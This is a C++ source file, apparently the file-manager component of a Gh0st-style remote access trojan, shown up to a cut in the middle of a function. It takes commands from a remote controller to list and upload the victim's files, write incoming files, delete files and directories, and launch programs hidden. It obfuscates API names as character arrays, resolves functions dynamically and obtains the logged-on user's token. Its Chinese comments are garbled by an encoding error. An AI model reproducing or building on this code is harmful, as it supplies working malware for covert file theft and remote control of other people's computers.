// FileManager.cpp: implementation of the CFileManager class.
//
//////////////////////////////////////////////////////////////////////
#define _WIN32_WINNT 0x0501
#include "FileManager.h"
#include <LM.h>
#include <ShlObj.h>
#include <shellapi.h>

typedef struct 
{
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
}FILESIZE;

enum
{
	COMMAND_COMPRESS_FILE_PARAM,
};

extern FARPROC MyGetProcAddressA(LPCSTR lpFileName, LPCSTR lpProcName);
extern bool OpenFile1(LPCTSTR lpFile, BOOL bRunInAcsiUser, INT nShowCmd);

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CFileManager::CFileManager(CClientSocket *pClient):CManager(pClient)
{
	m_bIsWow64 = FALSE;
	IsWow64Process(GetCurrentProcess(), &m_bIsWow64);
	m_hFileSend = INVALID_HANDLE_VALUE;
	m_hFileRecv = INVALID_HANDLE_VALUE;
	m_nTransferMode = TRANSFER_MODE_NORMAL;
	// �����������б�, ��ʼ�����ļ������������߳�
	SendDriveList();
}

CFileManager::~CFileManager()
{
	m_UploadList.clear();
	if (m_hFileSend != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hFileSend);
		m_hFileSend = INVALID_HANDLE_VALUE;
	}
	if (m_hFileRecv != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hFileRecv);
		m_hFileRecv = INVALID_HANDLE_VALUE;
	}
}

void CFileManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	PVOID OldValue = NULL;
	BOOL bRevert = FALSE;
	if (m_bIsWow64)
	{
		char AjrFx[]={'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
		char xTfkA[]={'W','o','w','6','4','D','i','s','a','b','l','e','W','o','w','6','4','F','s','R','e','d','i','r','e','c','t','i','o','n','\0'};
		typedef BOOL (WINAPI *Wow64DisableWow64FsRedirectionT)(PVOID *OldValue);
		Wow64DisableWow64FsRedirectionT pWow64DisableWow64FsRedirection=(Wow64DisableWow64FsRedirectionT)MyGetProcAddressA(AjrFx,xTfkA);
		if (pWow64DisableWow64FsRedirection)
			bRevert = pWow64DisableWow64FsRedirection(&OldValue);
	}
	
	switch (lpBuffer[0])
	{
	case COMMAND_LIST_FILES:			// ��ȡ�����б�(�ļ��б�)
		SendFilesList((char *)lpBuffer + 1);
		break;
	case COMMAND_DELETE_FILE:			// ���ض�ɾ�������ļ�
		DeleteFile((char *)lpBuffer + 1);
		SendToken(TOKEN_DELETE_FINISH);
		break;
	case COMMAND_DELETE_DIRECTORY:		// ���ض�ɾ�������ļ���
		DeleteDirectory((char *)lpBuffer + 1);
		SendToken(TOKEN_DELETE_FINISH);
		break;
	case COMMAND_DOWN_FILES:			// �ϴ��ļ�, ���ڿ��ƶ���˵�������ļ�, ���ƶ˽������ļ�(���ļ�)
		UploadToRemote(lpBuffer + 1);
		break;
	case COMMAND_CONTINUE:				// �ϴ�����, ���ڿ��ƶ���˵����������, ���ƶ˽��������ݵ�֮ǰ�����Ŀ��ļ�
		SendFileData(lpBuffer + 1);
		break;
	case COMMAND_CREATE_FOLDER:			// ���ض˴���һ���յ��ļ���
		CreateFolder(lpBuffer + 1);
		break;
	case COMMAND_RENAME_FILE:			// ���ض��������ļ���(�ļ�)
		Rename(lpBuffer + 1);
		break;
	case COMMAND_STOP:					// �˴�����
		StopTransfer(*&lpBuffer[1]);
		break;
	case COMMAND_SET_TRANSFER_MODE:		// �����ļ�(���ڿ��ƶ���˵���ϴ��ļ�)ʱ�Ĵ���ģʽ, �������Ǽ̴�������
		SetTransferMode(lpBuffer + 1);
		break;
	case COMMAND_FILE_SIZE:				// �����ļ�, ���ڿ��ƶ���˵���ϴ��ļ�, ���ض˽������ļ�(���ļ�)
		CreateLocalRecvFile(lpBuffer + 1);
		break;
	case COMMAND_FILE_DATA:				// ��������, ���ڿ��ƶ���˵���ϴ�����, ���ض˽��������ݵ�֮ǰ�����Ŀ��ļ�
		WriteLocalRecvFile(lpBuffer + 1, nSize - 1);
		break;
	case COMMAND_OPEN_FILE_SHOW:		// ���ض��Կɼ���ʽ��ָ�����ļ�(Ŀ¼)
		OpenFile1((char *)lpBuffer + 2, !*(lpBuffer + 1), SW_SHOW);
		//ShellExecute(NULL, "open", (char *)lpBuffer + 1, NULL, NULL, SW_SHOW);
		break;
	case COMMAND_OPEN_FILE_HIDE:		// ���ض������ط�ʽ��ָ�����ļ�(Ŀ¼)
		OpenFile1((char *)lpBuffer + 2, !*(lpBuffer + 1), SW_HIDE);
		//ShellExecute(NULL, "open", (char *)lpBuffer + 1, NULL, NULL, SW_HIDE);
		break;
	case COMMAND_COMPRESS_FILE_PARAM:	// ���ض���(WinRAR)ѹ�����ѹָ�����ļ�(Ŀ¼)
		ExeCompress(lpBuffer + 1);
		break;
	default:
		break;
	}
	
	if (bRevert)
	{
		char VjrFx[]={'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
		char xTfkV[]={'W','o','w','6','4','R','e','v','e','r','t','W','o','w','6','4','F','s','R','e','d','i','r','e','c','t','i','o','n','\0'};
		typedef BOOL (WINAPI *Wow64RevertWow64FsRedirectionT)(PVOID OldValue);
		Wow64RevertWow64FsRedirectionT pWow64RevertWow64FsRedirection=(Wow64RevertWow64FsRedirectionT)MyGetProcAddressA(VjrFx,xTfkV);
		if (pWow64RevertWow64FsRedirection)
			pWow64RevertWow64FsRedirection(OldValue);
	}
}

bool CFileManager::MakeSureDirectoryPathExists(LPCTSTR pszDirPath)
{
    LPTSTR p, pszDirCopy;
    DWORD dwAttributes;

    // Make a copy of the string for editing.
    __try
    {
        pszDirCopy = (LPTSTR)malloc(sizeof(TCHAR) * (lstrlen(pszDirPath) + 1));

        if(pszDirCopy == NULL)
            return FALSE;

        lstrcpy(pszDirCopy, pszDirPath);

        p = pszDirCopy;

        //  If the second character in the path is "\", then this is a UNC
        //  path, and we should skip forward until we reach the 2nd \ in the path.

        if((*p == TEXT('\\')) && (*(p+1) == TEXT('\\')))
        {
            p++;            // Skip over the first \ in the name.
            p++;            // Skip over the second \ in the name.

            //  Skip until we hit the first "\" (\\Server\).

            while(*p && *p != TEXT('\\'))
            {
                p = CharNext(p);
            }

            // Advance over it.

            if(*p)
            {
                p++;
            }

            //  Skip until we hit the second "\" (\\Server\Share\).

            while(*p && *p != TEXT('\\'))
            {
                p = CharNext(p);
            }

            // Advance over it also.

            if(*p)
            {
                p++;
            }

        }
        else if(*(p+1) == TEXT(':')) // Not a UNC.  See if it's <drive>:
        {
            p++;
            p++;

            // If it exists, skip over the root specifier

            if(*p && (*p == TEXT('\\')))
            {
                p++;
            }
        }

		while(*p)
        {
            if(*p == TEXT('\\'))
            {
                *p = TEXT('\0');
                dwAttributes = GetFileAttributes(pszDirCopy);

                // Nothing exists with this name.  Try to make the directory name and error if unable to.
                if(dwAttributes == 0xffffffff)
                {
                    if(!CreateDirectory(pszDirCopy, NULL))
                    {
                        if(GetLastError() != ERROR_ALREADY_EXISTS)
                        {
                            free(pszDirCopy);
                            return FALSE;
                        }
                    }
                }
                else
                {
                    if((dwAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
                    {
                        // Something exists with this name, but it's not a directory... Error
                        free(pszDirCopy);
                        return FALSE;
                    }
                }
 
                *p = TEXT('\\');
            }

            p = CharNext(p);
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {
        // SetLastError(GetExceptionCode());
        free(pszDirCopy);
        return FALSE;
    }

    free(pszDirCopy);
    return TRUE;
}

bool CFileManager::OpenFile(LPCTSTR lpFile, INT nShowCmd)
{
	char	lpSubKey[500];
	HKEY	hKey;
	char	strTemp[MAX_PATH];
	LONG	nSize = sizeof(strTemp);
	char	*lpstrCat = NULL;
	memset(strTemp, 0, sizeof(strTemp));
	
	char	*lpExt = strrchr(lpFile, '.');
	if (!lpExt)
		return false;
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpExt, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	memset(lpSubKey, 0, sizeof(lpSubKey));
	wsprintf(lpSubKey, "%s\\shell\\open\\command", strTemp);
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	memset(strTemp, 0, sizeof(strTemp));
	nSize = sizeof(strTemp);
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	char str175914[]={'\"','%','1','\0'};
	char str175947[]={'%','1','\0'};
	lpstrCat = strstr(strTemp, str175914);
	if (lpstrCat == NULL)
		lpstrCat = strstr(strTemp,str175947);
	
	if (lpstrCat == NULL)
	{
		lstrcat(strTemp, " ");
		lstrcat(strTemp, lpFile);
	}
	else
		lstrcpy(lpstrCat, lpFile);
	
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	char str142919[]={'W','i','n','S','t','a','0','\\','D','e','f','a','u','l','t','\0'};
	if (nShowCmd != SW_HIDE)
		si.lpDesktop = str142919; 
	
	return CreateProcess(NULL, strTemp, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
}

HANDLE CFileManager::ImpersonateLoggedOnUserWrapper()
{
	char iOagR[]={'K','E','R','N','E','L','3','2','.','d','l','l','\0'};
	char wSuTs[]={'W','T','S','G','e','t','A','c','t','i','v','e','C','o','n','s','o','l','e','S','e','s','s','i','o','n','I','d','\0'};
	typedef DWORD (WINAPI *WTSGetActiveConsoleSessionIdT)(void);
	WTSGetActiveConsoleSessionIdT pWTSGetActiveConsoleSessionId=(WTSGetActiveConsoleSessionIdT)MyGetProcAddressA(iOagR,wSuTs);
	
	char oIksN[]={'W','T','S','A','P','I','3','2','.','d','l','l','\0'};
	char xAsDm[]={'W','T','S','Q','u','e','r','y','U','s','e','r','T','o','k','e','n','\0'};
	typedef BOOL (WINAPI *WTSQueryUserTokenT)(ULONG SessionId,PHANDLE phToken);
	WTSQueryUserTokenT pWTSQueryUserToken=(WTSQueryUserTokenT)MyGetProcAddressA(oIksN,xAsDm);
	
	char AjrFx[]={'A','D','V','A','P','I','3','2','.','d','l','l','\0'};
	char kbCfr[]={'I','m','p','e','r','s','o','n','a','t','e','L','o','g','g','e','d','O','n','U','s','e','r','\0'};
	typedef BOOL (WINAPI *ImpersonateLoggedOnUserT)(HANDLE hToken);
	ImpersonateLoggedOnUserT pImpersonateLoggedOnUser=(ImpersonateLoggedOnUserT)MyGetProcAddressA(AjrFx,kbCfr);
	
	HANDLE hToken = NULL;
	if (pWTSGetActiveConsoleSessionId && pWTSQueryUserToken && pImpersonateLoggedOnUser)
	{
		DWORD dwConsoleSessionId = pWTSGetActiveConsoleSessionId();
		if (pWTSQueryUserToken(dwConsoleSessionId, &hToken))
		{
//			if (pImpersonateLoggedOnUser(hToken))
				return hToken;
		}
	}
	return NULL;
}

UINT CFileManager::SendDriveList()
{
	char	DriveString[256];
	// ǰһ���ֽ�Ϊ���ƣ������52�ֽ�Ϊ���������������
	BYTE	DriveList[2048];
	char	FileSystem[MAX_PATH];
	char	*pDrive = NULL;
	char	szUserName[UNLEN+1];
	DWORD	dwUserLen = UNLEN;
	DriveList[0] = TOKEN_DRIVE_LIST; // �������б�
	GetLogicalDriveStrings(sizeof(DriveString), DriveString);
	pDrive = DriveString;
	
	unsigned __int64	HDAmount = 0;
	unsigned __int64	HDFreeSpace = 0;
	unsigned long		AmntMB = 0; // �ܴ�С
	unsigned long		FreeMB = 0; // ʣ��ռ�
	
	GetUserName(szUserName, &dwUserLen);
	if (stricmp(szUserName, "SYSTEM") == 0)
		DriveList[1] = TRUE;
	else
		DriveList[1] = FALSE;
	
	HANDLE hTokenAcsi = ImpersonateLoggedOnUserWrapper();
//	SHGetSpecialFolderPath(NULL, (char *)&DriveList[1], CSIDL_DESKTOPDIRECTORY, FALSE);
	SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, hTokenAcsi, SHGFP_TYPE_CURRENT, (char *)&DriveList[2]);
//	RevertToSelf();
	CloseHandle(hTokenAcsi);
	
	for (DWORD dwOffset = 1 + 1 + lstrlen((char *)&DriveList[2]) + 1; *pDrive != '\0'; pDrive += lstrlen(pDrive) + 1)
	{
		memset(FileSystem, 0, sizeof(FileSystem));
		// �õ��ļ�ϵͳ��Ϣ����С
		GetVolumeInformation(pDrive, NULL, 0, NULL, NULL, NULL, FileSystem, MAX_PATH);
		SHFILEINFO	sfi;
		SHGetFileInfo(pDrive, FILE_ATTRIBUTE_NORMAL, &sfi, sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
		
		int	nTypeNameLen = lstrlen(sfi.szTypeName) + 1;
		int	nFileSystemLen = lstrlen(FileSystem) + 1;
		
		// ������̴�С
		if (pDrive[0] != 'A' && pDrive[0] != 'B' && GetDiskFreeSpaceEx(pDrive, (PULARGE_INTEGER)&HDFreeSpace, (PULARGE_INTEGER)&HDAmount, NULL))
		{	
			AmntMB = HDAmount / 1024 / 1024;
			FreeMB = HDFreeSpace / 1024 / 1024;
		}
		else
		{
			AmntMB = 0;
			FreeMB = 0;
		}
		// ��ʼ��ֵ
		DriveList[dwOffset] = pDrive[0];
		DriveList[dwOffset + 1] = GetDriveType(pDrive);
		
		// ���̿ռ�����ռȥ��8�ֽ�
		memcpy(DriveList + dwOffset + 2, &AmntMB, sizeof(unsigned long));
		memcpy(DriveList + dwOffset + 6, &FreeMB, sizeof(unsigned long));
		
		// ���̾��������������
		memcpy(DriveList + dwOffset + 10, sfi.szTypeName, nTypeNameLen);
		memcpy(DriveList + dwOffset + 10 + nTypeNameLen, FileSystem, nFileSystemLen);
		
		dwOffset += 10 + nTypeNameLen + nFileSystemLen;
	}

	return Send((LPBYTE)DriveList, dwOffset);
}

UINT CFileManager::SendFilesList(LPCTSTR lpszDirectory)
{
	// ���ô��䷽ʽ
	m_nTransferMode = TRANSFER_MODE_NORMAL;	

	UINT	nRet = 0;
	char	strPath[MAX_PATH];
	char	*lpszSlash = NULL;
	char	*pszFileName = NULL;
	LPBYTE	lpList = NULL;
	HANDLE	hFile;
	DWORD	dwOffset = 0; // λ��ָ��
	int		nLen = 0;
	DWORD	nBufferSize =  1024 * 10; // �ȷ���10K�Ļ�����
	WIN32_FIND_DATA	FindFileData;
	
	if (lpszDirectory[lstrlen(lpszDirectory) - 1] != '\\')
		lpszSlash = "\\";
	else
		lpszSlash = "";
	char str18010[]={'%','s','%','s','*','.','*','\0'};
	wsprintf(strPath,str18010, lpszDirectory, lpszSlash);
	hFile = FindFirstFile(strPath, &FindFileData);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		BYTE bToken = TOKEN_FILE_LIST;
		return Send(&bToken, 1);
	}
	
	lpList = (BYTE *)LocalAlloc(LPTR, nBufferSize);
	*lpList = TOKEN_FILE_LIST;
	
	// 1 Ϊ���ݰ�ͷ����ռ�ֽ�,���ֵ
	dwOffset = 1;
	/*
	�ļ�����	1
	�ļ���		strlen(filename) + 1 ('\0')
	�ļ���С	4
	*/
	do 
	{
		// ��̬��չ������
		if (dwOffset > (nBufferSize - MAX_PATH * 2))
		{
			nBufferSize += MAX_PATH * 2;
			lpList = (BYTE *)LocalReAlloc(lpList, nBufferSize, LMEM_ZEROINIT|LMEM_MOVEABLE);
		}
		pszFileName = FindFileData.cFileName;
		if (strcmp(pszFileName, ".") == 0 || strcmp(pszFileName, "..") == 0)
			continue;
		// �ļ����� 1 �ֽ�
		*(lpList + dwOffset) = FindFileData.dwFileAttributes &	FILE_ATTRIBUTE_DIRECTORY;
		dwOffset++;
		// �ļ��� lstrlen(pszFileName) + 1 �ֽ�
		nLen = lstrlen(pszFileName);
		memcpy(lpList + dwOffset, pszFileName, nLen);
		dwOffset += nLen;
		*(lpList + dwOffset) = 0;
		dwOffset++;
		
		// �ļ���С 8 �ֽ�
		memcpy(lpList + dwOffset, &FindFileData.nFileSizeHigh, sizeof(DWORD));
		memcpy(lpList + dwOffset + 4, &FindFileData.nFileSizeLow, sizeof(DWORD));
		dwOffset += 8;
		// ������ʱ�� 8 �ֽ�
		memcpy(lpList + dwOffset, &FindFileData.ftLastWriteTime, sizeof(FILETIME));
		dwOffset += 8;
	} while(FindNextFile(hFile, &FindFileData));

	nRet = Send(lpList, dwOffset);

	LocalFree(lpList);
	FindClose(hFile);
	return nRet;
}

bool CFileManager::DeleteDirectory(LPCTSTR lpszDirectory)
{
	WIN32_FIND_DATA	wfd;
	char	lpszFilter[MAX_PATH];
	char	*lpszSlash = NULL;
	memset(lpszFilter, 0, sizeof(lpszFilter));
	
	if (lpszDirectory[lstrlen(lpszDirectory) - 1] != '\\')
		lpszSlash = "\\";
	else
		lpszSlash = "";
    char str18114[]={'%','s','%','s','*','.','*','\0'};
	wsprintf(lpszFilter,str18114, lpszDirectory, lpszSlash);
	
	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // ���û���ҵ������ʧ��
		return false;
	char str18046[]={'%','s','%','s','%','s','\0'};
	do
	{
		if (wfd.cFileName[0] != '.')
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char strDirectory[MAX_PATH];
				wsprintf(strDirectory,str18046, lpszDirectory, lpszSlash, wfd.cFileName);
				DeleteDirectory(strDirectory);
			}
			else
			{
				char strFile[MAX_PATH];
				wsprintf(strFile,str18046, lpszDirectory, lpszSlash, wfd.cFileName);
				if (wfd.dwFileAttributes & FILE_ATTRIBUTE_READONLY)
					SetFileAttributes(strFile, FILE_ATTRIBUTE_NORMAL);
				DeleteFile(strFile);
			}
		}
	} while (FindNextFile(hFind, &wfd));
	
	FindClose(hFind); // �رղ��Ҿ��
	
	if(!RemoveDirectory(lpszDirectory))
	{
		return false;
	}
	return true;
}

UINT CFileManager::SendFileSize(LPCTSTR lpszFileName)
{
	UINT	nRet = 0;
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
	// ���浱ǰ���ڲ������ļ���
	memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
	strcpy(m_strCurrentProcessFileName, lpszFileName);
	
	if (m_hFileSend != INVALID_HANDLE_VALUE)
		CloseHandle(m_hFileSend);
	m_hFileSend = CreateFile(lpszFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (m_hFileSend == INVALID_HANDLE_VALUE)
		return FALSE;
	dwSizeLow =	GetFileSize(m_hFileSend, &dwSizeHigh);
	//CloseHandle(m_hFileSend); // �˴���Ҫ�ر�, �Ժ�Ҫ��
	// �������ݰ��������ļ�����(1�ֽ�token, 8�ֽڴ�С, �ļ�����, '\0')
	int		nPacketSize = lstrlen(lpszFileName) + 10;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
	memset(bPacket, 0, nPacketSize);
	
	bPacket[0] = TOKEN_FILE_SIZE;
	FILESIZE *pFileSize = (FILESIZE *)(bPacket + 1);
	pFileSize->dwSizeHigh = dwSizeHigh;
	pFileSize->dwSizeLow = dwSizeLow;
	memcpy(bPacket + 9, lpszFileName, lstrlen(lpszFileName) + 1);

	nRet = Send(bPacket, nPacketSize);
	LocalFree(bPacket);
	return nRet;
}

UINT CFileManager::SendFileData(LPBYTE lpBuffer)
{
	UINT		nRet;
	FILESIZE	*pFileSize;
	char		*lpFileName;

	pFileSize = (FILESIZE *)lpBuffer;
	lpFileName = m_strCurrentProcessFileName;

	// Զ��������������һ��
	if (pFileSize->dwSizeHigh == -1 && pFileSize->dwSizeLow == -1)
	{
		UploadNext();
		return 0;
	}

	SetFilePointer(m_hFileSend, pFileSize->dwSizeLow, (long *)&(pFileSize->dwSizeHigh), FILE_BEGIN);

	int		nHeadLength = 9; // 1 + 4 + 4���ݰ�ͷ����С
	DWORD	nNumberOfBytesToRead = MAX_SEND_BUFFER - nHeadLength;
	DWORD	nNumberOfBytesRead = 0;

	LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, MAX_SEND_BUFFER);
	// Token,  ��С��ƫ�ƣ��ļ���������
	lpPacket[0] = TOKEN_FILE_DATA;
	memcpy(lpPacket + 1, pFileSize, sizeof(FILESIZE));
	ReadFile(m_hFileSend, lpPacket + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
	//CloseHandle(m_hFileSend); // �˴���Ҫ�ر�, �Ժ�Ҫ��

	if (nNumberOfBytesRead > 0)
	{
		int	nPacketSize = nNumberOfBytesRead + nHeadLength;
		nRet = Send(lpPacket, nPacketSize);
	}
	else
	{
		UploadNext();
	}

	LocalFree(lpPacket);

	return nRet;
}

// ������һ���ļ�
void CFileManager::UploadNext()
{
	if (m_hFileSend != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hFileSend);
		m_hFileSend = INVALID_HANDLE_VALUE;
	}
	list <string>::iterator it = m_UploadList.begin();
	// ɾ��һ������
	m_UploadList.erase(it);
	// �����ϴ�����
	if(m_UploadList.empty())
	{
		SendToken(TOKEN_TRANSFER_FINISH);
	}
	else
	{
		// �ϴ���һ��
		it = m_UploadList.begin();
		SendFileSize((*it).c_str());
	}
}

int CFileManager::SendToken(BYTE bToken)
{
	return Send(&bToken, 1);
}

bool CFileManager::UploadToRemote(LPBYTE lpBuffer)
{
	if (lpBuffer[lstrlen((char *)lpBuffer) - 1] == '\\')
	{
		FixedUploadList((char *)lpBuffer);
		if (m_UploadList.empty())
		{
			StopTransfer(TRUE);
			return true;
		}
	}
	else
	{
		m_UploadList.push_back((char *)lpBuffer);
	}

	list <string>::iterator it = m_UploadList.begin();
	// ���͵�һ���ļ�
	SendFileSize((*it).c_str());

	return true;
}

bool CFileManager::FixedUploadList(LPCTSTR lpPathName)
{
	WIN32_FIND_DATA	wfd;
	char	lpszFilter[MAX_PATH];
	char	*lpszSlash = NULL;
	memset(lpszFilter, 0, sizeof(lpszFilter));

	if (lpPathName[lstrlen(lpPathName) - 1] != '\\')
		lpszSlash = "\\";
	else
		lpszSlash = "";
    char str18114[]={'%','s','%','s','*','.','*','\0'};
	wsprintf(lpszFilter,str18114, lpPathName, lpszSlash);
	
	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // ���û���ҵ������ʧ��
		return false;
	char str18046[]={'%','s','%','s','%','s','\0'};
	do
	{
		if (wfd.cFileName[0] != '.')
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char strDirectory[MAX_PATH];
				wsprintf(strDirectory,str18046, lpPathName, lpszSlash, wfd.cFileName);
				FixedUploadList(strDirectory);
			}
			else
			{
				char strFile[MAX_PATH];
				wsprintf(strFile,str18046, lpPathName, lpszSlash, wfd.cFileName);
				m_UploadList.push_back(strFile);
			}
		}
	} while (FindNextFile(hFind, &wfd));
	
	FindClose(hFind); // �رղ��Ҿ��
	return true;
}

void CFileManager::StopTransfer(BOOL bIsUpload)
{
	if (!m_UploadList.empty())
		m_UploadList.clear();
	if (m_hFileSend != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hFileSend);
		m_hFileSend = INVALID_HANDLE_VALUE;
	}
	if (m_hFileRecv != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hFileRecv);
		m_hFileRecv = INVALID_HANDLE_VALUE;
	}
	if (bIsUpload)
		SendToken(TOKEN_TRANSFER_FINISH);
}

void CFileManager::CreateLocalRecvFile(LPBYTE lpBuffer)
{
	FILESIZE	*pFileSize = (FILESIZE *)lpBuffer;
	// ���浱ǰ���ڲ������ļ���
	memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
	strcpy(m_strCurrentProcessFileName, (char *)lpBuffer + 8);
	
	// �����ļ�����
	m_nCurrentProcessFileLength = ((__int64)pFileSize->dwSizeHigh << 32) + pFileSize->dwSizeLow;
	
	// �������Ŀ¼
	MakeSureDirectoryPathExists(m_strCurrentProcessFileName);
	
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(m_strCurrentProcessFileName, &FindFileData);
	
	if (hFind != INVALID_HANDLE_VALUE
		&& m_nTransferMode != TRANSFER_MODE_OVERWRITE_ALL 
		&& m_nTransferMode != TRANSFER_MODE_ADDITION_ALL
		&& m_nTransferMode != TRANSFER_MODE_JUMP_ALL
		)
	{
		SendToken(TOKEN_GET_TRANSFER_MODE);
	}
	else
	{
		GetFileData();
	}
	FindClose(hFind);
}

void CFileManager::GetFileData()
{
	int	nTransferMode;
	switch (m_nTransferMode)
	{
	case TRANSFER_MODE_OVERWRITE_ALL:
		nTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case TRANSFER_MODE_ADDITION_ALL:
		nTransferMode = TRANSFER_MODE_ADDITION;
		break;
	case TRANSFER_MODE_JUMP_ALL:
		nTransferMode = TRANSFER_MODE_JUMP;
		break;
	default:
		nTransferMode = m_nTransferMode;
	}
	
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(m_strCurrentProcessFileName, &FindFileData);
	
	//  1�ֽ�Token,���ֽ�ƫ�Ƹ���λ�����ֽ�ƫ�Ƶ���λ
	BYTE	bToken[9];
	DWORD	dwCreationDisposition; // �ļ��򿪷�ʽ 
	memset(bToken, 0, sizeof(bToken));
	bToken[0] = TOKEN_DATA_CONTINUE;
	
	// �ļ��Ѿ�����
	if (hFind != INVALID_HANDLE_VALUE)
	{
		// ��ʾ��ʲô
		// ���������
		if (nTransferMode == TRANSFER_MODE_ADDITION)
		{
			memcpy(bToken + 1, &FindFileData.nFileSizeHigh, 4);
			memcpy(bToken + 5, &FindFileData.nFileSizeLow, 4);
			dwCreationDisposition = OPEN_EXISTING;
		}
		// ����
		else if (nTransferMode == TRANSFER_MODE_OVERWRITE)
		{
			// ƫ����0
			memset(bToken + 1, 0, 8);
			// ���´���
			dwCreationDisposition = CREATE_ALWAYS;
			
		}
		// ������һ��
		else if (nTransferMode == TRANSFER_MODE_JUMP)
		{
			DWORD dwOffset = -1;
			memcpy(bToken + 1, &dwOffset, 4);
			memcpy(bToken + 5, &dwOffset, 4);
			dwCreationDisposition = OPEN_EXISTING;
		}
	}
	else
	{
		// ƫ����0
		memset(bToken + 1, 0, 8);
		// ���´���
		dwCreationDisposition = CREATE_ALWAYS;
	}
	FindClose(hFind);
	
	if (m_hFileRecv != INVALID_HANDLE_VALUE)
		CloseHandle(m_hFileRecv);
	m_hFileRecv = CreateFile(m_strCurrentProcessFileName,
		GENERIC_WRITE, 0, NULL, dwCreationDisposition, FILE_ATTRIBUTE_NORMAL, 0);
	// ��Ҫ������
	if (m_hFileRecv == INVALID_HANDLE_VALUE)
	{
		m_nCurrentProcessFileLength = 0;
		return;
	}
	//CloseHandle(m_hFileRecv); // �˴���Ҫ�ر�, �Ժ�Ҫ��

	Send(bToken, sizeof(bToken));
}

void CFileManager::WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize)
{
	// �������
	BYTE		*pData;
	DWORD		dwBytesToWrite;
	DWORD		dwBytesWrite;
	int			nHeadLength = 9; // 1 + 4 + 4  ���ݰ�ͷ����С��Ϊ�̶���9
	FILESIZE	*pFileSize;
	
	// �õ����ݵ�ƫ��
	pData = lpBuffer + 8;
	pFileSize = (FILESIZE *)lpBuffer;
	
	// �õ��������ļ��е�ƫ��
	LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;
	
	dwBytesToWrite = nSize - 8;
	
	SetFilePointer(m_hFileRecv, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);
	
	BOOL bRet = WriteFile(m_hFileRecv, pData, dwBytesToWrite, &dwBytesWrite, NULL);
// 	if (bRet == FALSE)
// 		printf("�ļ�д��ʧ��");
	dwOffsetLow = 0; dwOffsetHigh = 0;
	dwOffsetLow = SetFilePointer(m_hFileRecv, dwOffsetLow, &dwOffsetHigh, FILE_CURRENT);
	//CloseHandle(m_hFileRecv);  // �˴���Ҫ�ر�, �Ժ�Ҫ��
	// Ϊ�˱Ƚϣ�����������
	
	BYTE	bToken[9];
	bToken[0] = TOKEN_DATA_CONTINUE;
	memcpy(bToken + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
	memcpy(bToken + 5, &dwOffsetLow, sizeof(dwOffsetLow));
	Send(bToken, sizeof(bToken));
}

void CFileManager::SetTransferMode(LPBYTE lpBuffer)
{
	memcpy(&m_nTransferMode, lpBuffer, sizeof(m_nTransferMode));
	GetFileData();
}

void CFileManager::CreateFolder(LPBYTE lpBuffer)
{
	MakeSureDirectoryPathExists((char *)lpBuffer);
	SendToken(TOKEN_CREATEFOLDER_FINISH);
}

void CFileManager::Rename(LPBYTE lpBuffer)
{
	LPCTSTR lpExistingFileName = (char *)lpBuffer;
	LPCTSTR lpNewFileName = lpExistingFileName + lstrlen(lpExistingFileName) + 1;
	::MoveFile(lpExistingFileName, lpNewFileName);
	SendToken(TOKEN_RENAME_FINISH);
}

//ѹ�����ѹ���ļ�
void CFileManager::ExeCompress(BYTE *lpBuffer)
{
	SHELLEXECUTEINFO ShExecInfo = {0};
	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	ShExecInfo.lpVerb = NULL;
	ShExecInfo.lpFile = "WinRAR";
	ShExecInfo.lpParameters = (char*)lpBuffer;
	ShExecInfo.nShow = SW_HIDE;
	if (ShellExecuteEx(&ShExecInfo))
	{
		WaitForSingleObject(ShExecInfo.hProcess, INFINITE);
